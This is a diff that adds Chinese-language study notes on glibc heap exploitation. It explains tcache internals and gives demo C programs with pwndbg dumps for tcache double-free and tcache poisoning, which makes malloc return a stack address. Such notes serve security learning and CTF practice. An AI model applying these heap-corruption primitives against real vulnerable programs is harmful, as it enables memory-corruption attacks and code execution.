+p2 = malloc(0x1000);
+```
+
+当前堆的情况:
+
+```
+pwndbg> x/4gx 0x602000                               ----> p1
+0x602000:	0x0000000000000000	0x0000000000000401
+0x602010:	0x0000000000000000	0x0000000000000000
+pwndbg> x/4gx 0x602400                               -----> old top_chunk
+0x602400:	0x0000000000000000	0x0000000000000be1   -----> 0x602400+0xbe0=0x602fe0
+0x602410:	0x00007ffff7dd1b78	0x00007ffff7dd1b78   -----> 0x602fe0 + 0x20 = 0x603000
+pwndbg> x/4gx 0x602fe0               ----> old top_chunk缩小0x20,用于保存fencepost chunk
+0x602fe0:	0x0000000000000be0	0x0000000000000010
+0x602ff0:	0x0000000000000000	0x0000000000000011
+pwndbg> x/4gx 0x603000
+0x603000:	0x0000000000000000	0x0000000000000000
+0x603010:	0x0000000000000000	0x0000000000000000
+pwndbg> x/4xg 0x623000                               ------> p2
+0x623000:	0x0000000000000000	0x0000000000001011
+0x623010:	0x0000000000000000	0x0000000000000000
+```
+
+p2被分配在新的页中，也就是`0x603000 + 0x21000 = 0x623000`中。
+
+这时候，top chunk将被分配到unsorted bin中。
+
+未完待续!!!
+
+# tcache_dup
+
+glibc2.26版本中新加了一种名叫tcache(thread local caching)的缓存机制。
+
+它被集成到了libc2.26中，它对每个线程增加一个bin缓存，这样能显著地提高性能，默认情况下，每个线程有64个bins，以16(8)递增，mensize从24(12)到1032(516)。
+
+**chunk进入tcache的情形**
+
+1. 释放时，_int_free中在检查了size合法后，放入fastbin之前，它先尝试将其放入tcache
+
+2. 在_int_malloc中，若fastbins中取出块则将对应bin中其余chunk填入tcache对应项直到填满（smallbins中也是如此）：
+3. 当进入unsorted bin(同时发生堆块合并）中找到精确的大小时，并不是直接返回而是先加入tcache中，直到填满：
+
+**从tcache获取chunk的情形**
+
+1. 在__libc_malloc，_int_malloc之前，如果tcache中存在满足申请需求大小的块，就从对应的tcache中返回chunk
+
+2. 在遍历完unsorted bin(同时发生堆块合并）之后，若是tcache中有对应大小chunk则取出并返回：
+
+由上可知malloc会优先考虑tcache，在使用它之前只有size等很少的完整性校验(只有存入前有size >= MINSIZE && aligned_OK (size) && !misaligned_chunk (p) && (uintptr_t) p <= (uintptr_t) -size)，而它本身并没有什么完整性校验，于是利用它进行攻击会简单很多。
+
+```
+#include <stdio.h>
+#include <stdlib.h>
+
+int main()
+{
+	fprintf(stderr, "This file demonstrates a simple double-free attack with tcache.\n");
+
+	fprintf(stderr, "Allocating buffer.\n");
+	int *a = malloc(8);
+
+	fprintf(stderr, "malloc(8): %p\n", a);
+	fprintf(stderr, "Freeing twice...\n");
+	free(a);
+	free(a);
+
+	fprintf(stderr, "Now the free list has [ %p, %p ].\n", a, a);
+	fprintf(stderr, "Next allocated buffers will be same: [ %p, %p ].\n", malloc(8), malloc(8));
+
+	return 0;
+}
+```
+
+* 申请chunk a
+
+* 连续释放两次
+* tcache free list中
+
+```
+tcachebins
+0x20 [  2]: 0x602260 ◂— 0x602260 /* '`"`' */
+```
+
+从而可以连续申请两次。
+
+# tcache_poisoning
+
+```
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+
+int main()
+{
+	fprintf(stderr, "This file demonstrates a simple tcache poisoning attack by tricking malloc into\n"
+	       "returning a pointer to an arbitrary location (in this case, the stack).\n"
+	       "The attack is very similar to fastbin corruption attack.\n\n");
+
+	size_t stack_var;
+	fprintf(stderr, "The address we want malloc() to return is %p.\n", (char *)&stack_var);
+
+	fprintf(stderr, "Allocating 1 buffer.\n");
+	intptr_t *a = malloc(128);
+	fprintf(stderr, "malloc(128): %p\n", a);
+	fprintf(stderr, "Freeing the buffer...\n");
+	free(a);
+
+	fprintf(stderr, "Now the tcache list has [ %p ].\n", a);
+	fprintf(stderr, "We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"
+		"to point to the location to control (%p).\n", sizeof(intptr_t), a, &stack_var);
+	a[0] = (intptr_t)&stack_var;
+
+	fprintf(stderr, "1st malloc(128): %p\n", malloc(128));
+	fprintf(stderr, "Now the tcache list has [ %p ].\n", &stack_var);
+
+	intptr_t *b = malloc(128);
+	fprintf(stderr, "2st malloc(128): %p\n", b);
+	fprintf(stderr, "We got the control\n");
+
+	return 0;
+}
+```
+
+* 首先申请一个chunk a
+
+* 释放a
+* 修改a[0]
+
+```
+pwndbg> bin
+tcachebins
+0x90 [  1]: 0x602260 —▸ 0x7fffffffddf0 —▸ 0x400840 (__libc_csu_init) ◂— push   r15
+pwndbg> p &stack_var
+$4 = (size_t *) 0x7fffffffddf0
+```
+
+* 连续申请两次，即可将stack_var申请出来
+
+
 
 
 
